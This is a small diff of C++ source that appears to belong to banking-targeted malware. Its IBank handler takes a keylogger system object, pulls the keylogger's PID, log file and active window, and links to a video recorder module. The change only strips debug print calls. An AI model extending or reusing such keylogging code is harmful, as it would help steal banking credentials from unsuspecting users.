@@ -23,7 +23,6 @@
 #include "Utils.h"
 #include "VideoRecorder.h"
 
-
 #include "Modules.h"
 
 
@@ -256,17 +255,14 @@ namespace IBank
 	void SystemActivated(LPVOID Sender)
 	{
 		System = (PKeyLogSystem)Sender;
-pOutputDebugStringA("00");
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
 
 		// Инициализируем данные системы
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
-pOutputDebugStringA("01");
 
 		Log.PID     = Logger->PID;
 		Log.LogFile = STR::New(Logger->FileName);
-pOutputDebugStringA("03");
 
 		// Определяем основное окно
 		Log.Wnd = Logger->ActiveWND;
